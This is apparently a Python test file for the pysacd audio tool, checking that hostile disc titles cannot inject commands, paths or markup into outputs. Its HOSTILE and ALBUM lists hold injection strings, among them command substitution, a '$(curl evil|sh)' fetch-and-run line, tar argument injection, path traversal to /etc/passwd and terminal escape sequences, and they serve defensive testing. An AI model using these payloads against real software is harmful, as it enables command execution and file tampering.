"""Hostile disc text must not become an injection (issue #17).

A crafted disc's title and track titles go through every writer and printer; nothing pysacd
creates or prints may carry control characters, command substitution, a leading '-', a path
outside the output directory, executable permissions or extra cue/XML structure.
"""

import contextlib
import io
import os
import re
import stat
import sys
import tempfile
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

sys.path.insert(0, os.path.dirname(__file__))
import sacdgen

from pysacd import safetext

HOSTILE = [
    "$(touch /tmp/pysacd-pwned)",
    "`id`",
    "--checkpoint-action=exec=sh x",
    "-rf",
    'a\nFILE "evil.wav" WAVE\nb',
    "\x1b]52;c;ZWNobw==\x07clip",
    "x\u202egpj.exe",
    "../../etc/passwd",
    ".bashrc",
    "\u200bzero\u200dwidth",
    "pipe | ; < > redirect",
    "\x9b31mC1 CSI",
]
ALBUM = "$(curl evil|sh) \x1b[31m\n../../x"


def _latin1(t: str) -> bool:
    try:
        t.encode("latin-1")
        return True
    except UnicodeEncodeError:
        return False


# sacdgen writes disc text as ISO-8859-1, like many real discs; bidi and zero-width characters
# reach pysacd through other disc charsets and MusicBrainz and are covered by Functions.
DISC_TITLES = [t for t in HOSTILE if _latin1(t)]
FORBIDDEN = re.compile(f"[\x00-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff"
                       f"{re.escape(safetext.NAME_UNSAFE)}]")


class Functions(unittest.TestCase):
    def test_name_component(self):
        for t in HOSTILE + [ALBUM]:
            n = safetext.name_component(t)
            self.assertFalse(FORBIDDEN.search(n), (t, n))
            self.assertFalse(n.startswith(("-", ".")), (t, n))
            self.assertNotIn("/", n)
            self.assertNotIn(n, ("", ".", ".."))

    def test_ordinary_names_unchanged(self):
        for t in ["Simon & Garfunkel", "Don't Stop", "Nevermind (Remastered) [24-96]", "R.E.M.",
                  "Sigur Rós", "Live!", "AC/DC"]:
            want = t.replace("/", "-")
            self.assertEqual(safetext.name_component(t), want)

    def test_sacd_extract_paths_keep_ordinary_text_byte_identical(self):
        # Real discs carry trailing spaces ("TOMMY ") and whitespace runs; sacd_extract keeps them,
        # so the compatible paths only drop control/bidi/zero-width characters.
        from pysacd import sbcompat
        for t in ["TOMMY ", "Emotional  Rescue", " lead", "Caf\u0065\u0301 decomposed", "Sigur R\u00f3s"]:
            self.assertEqual(sbcompat._b(t), t.encode("utf-8"))
            self.assertEqual(safetext.strip_controls(t), t)
        self.assertEqual(sbcompat._b("a\x1bb\u202ec"), b"a b c")

    def test_terminal_and_text(self):
        for t in HOSTILE:
            self.assertFalse(re.search(r"[\x00-\x1f\x7f-\x9f\u202a-\u202e]", safetext.for_terminal(t)), t)
            self.assertFalse(FORBIDDEN.sub("", "") or re.search(r"[\x00-\x1f\x7f-\x9f\u202a-\u202e]",
                                                                safetext.clean_text(t)), t)
        self.assertEqual(safetext.for_terminal("a\x1bb"), "a\\x1bb")
        self.assertEqual(safetext.for_terminal("a\tb\nc", keep_tab_newline=True), "a\tb\nc")


def _native_ok() -> bool:
    try:
        from pysacd import _native
        _native._load()
        return True
    except (ImportError, OSError, RuntimeError):
        return False


@unittest.skipUnless(_native_ok(), "native engine not built")
class HostileDisc(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        frame = bytes([0x69]) * (4704 * 2)          # DSD silence, 2 channels
        frames = [frame] * (10 * len(DISC_TITLES))
        area = sacdgen.AreaSpec(2, frames, [10] * len(DISC_TITLES), dst=False, titles=DISC_TITLES)
        self.iso = self.root / "hostile.iso"
        sacdgen.build_iso(self.iso, [area], title=ALBUM)
        self.out = self.root / "out"
        self.out.mkdir()

    def tearDown(self):
        self.tmp.cleanup()

    def _check_tree(self):
        files = [p for p in self.out.rglob("*")]
        self.assertTrue(files)
        for p in files:
            rel = p.relative_to(self.out)
            self.assertTrue(p.resolve().is_relative_to(self.out.resolve()), rel)
            for part in rel.parts:
                self.assertFalse(FORBIDDEN.search(part), repr(part))
                self.assertFalse(part.startswith("-"), repr(part))
            if p.is_file():
                self.assertFalse(p.stat().st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH), rel)
        return files

    def test_extract_dsf_cue_xml_and_print(self):
        from pysacd import extract
        buf = io.StringIO()
        old = os.getcwd()
        os.chdir(self.out)
        try:
            with contextlib.redirect_stdout(buf):
                rc = extract.main(["-2", "-s", "-C", "-P", "-i", str(self.iso), "--no-cfg"])
        finally:
            os.chdir(old)
        self.assertEqual(rc, 0)
        self.assertFalse(re.search(r"[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e]", buf.getvalue()))
        files = self._check_tree()
        for cue in [p for p in files if p.suffix == ".cue"]:
            text = cue.read_bytes().decode("utf-8", "replace").lstrip("\ufeff")   # sacd_extract writes a BOM
            for line in filter(str.strip, text.splitlines()):
                self.assertRegex(line.strip(), r'^(REM|PERFORMER|TITLE|CATALOG|FILE|TRACK|INDEX|ISRC|SONGWRITER|FLAGS)\b',
                                 line)
            self.assertEqual(sum(1 for line in cue.read_text(errors="replace").splitlines()
                                 if line.startswith("FILE ")), 1)
        for x in [p for p in files if p.suffix == ".xml"]:
            ET.parse(x)                                 # well-formed, no injected markup
            self.assertFalse(re.search(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", x.read_text(errors="replace")))

    def test_collision_warnings_are_escaped(self):
        # #16: a second, different disc rendering into the same directory gets a warning that
        # quotes disc text; it must be escaped too.
        from pysacd.convert import Options, convert
        fr = bytes([0x69]) * (4704 * 2)
        isos = []
        for i, cat in enumerate(["CAT\x1b]0;x\x07-1", "CAT-2"]):
            iso = self.root / f"d{i}.iso"
            info = sacdgen.DiscInfo(title=ALBUM, disc_catalog=cat)
            sacdgen.build_iso(iso, [sacdgen.AreaSpec(2, [fr] * 20, [10, 10], dst=False,
                                                     titles=DISC_TITLES[:2])], info=info)
            isos.append(iso)
        err = io.StringIO()
        with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
            for iso in isos:
                convert(str(iso), Options(output_dir=str(self.out), musicbrainz=False, cover=False, format="dsf"))
        self.assertIn("warning", err.getvalue().lower())
        self.assertFalse(re.search(r"[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e]", err.getvalue()))
        self._check_tree()

    def test_convert_names_and_tags(self):
        from pysacd.convert import Options, convert
        opts = Options(output_dir=str(self.out), musicbrainz=False, cover=False, format="dsf")
        err = io.StringIO()
        with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(convert(str(self.iso), opts), 0)
        self.assertFalse(re.search(r"[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e]", err.getvalue()))
        files = self._check_tree()
        try:
            from mutagen.dsf import DSF
        except ImportError:
            return
        for p in [f for f in files if f.suffix == ".dsf"]:
            tags = DSF(p).tags
            for frame in tags.values():
                for v in getattr(frame, "text", []):
                    self.assertFalse(re.search(r"[\x00-\x1f\x7f-\x9f\u202a-\u202e\u200b-\u200f]", str(v)), (p, v))


class HostileMusicBrainz(unittest.TestCase):
    def test_isrc_plan_output(self):
        # MusicBrainz titles and formats are shown before ISRCs are submitted (#34)
        import types
        from unittest import mock

        from pysacd import isrcsubmit, musicbrainz
        rid = "00000000-0000-4000-8000-000000000000"
        medium = {"format": "SACD\x1b[2J\u202e", "tracks": [{"title": "t\x1b]52;c;AAAA\x07\nFAKE", "recording": {"id": rid}}]}
        m = musicbrainz.Match({"id": rid}, medium, 0.0, 0, "barcode")
        out: list[str] = []
        area = types.SimpleNamespace(tracks=[types.SimpleNamespace(isrc="GBAAA0400001")])
        with mock.patch.object(isrcsubmit, "_isrc_recordings", return_value=[]):
            isrcsubmit.offer(m, area, None, dry_run=True, out=out.append)
        self.assertFalse(re.search(r"[\x00-\x08\x0a-\x1f\x7f-\x9f\u202a-\u202e]", "".join(out)))


if __name__ == "__main__":
    unittest.main()
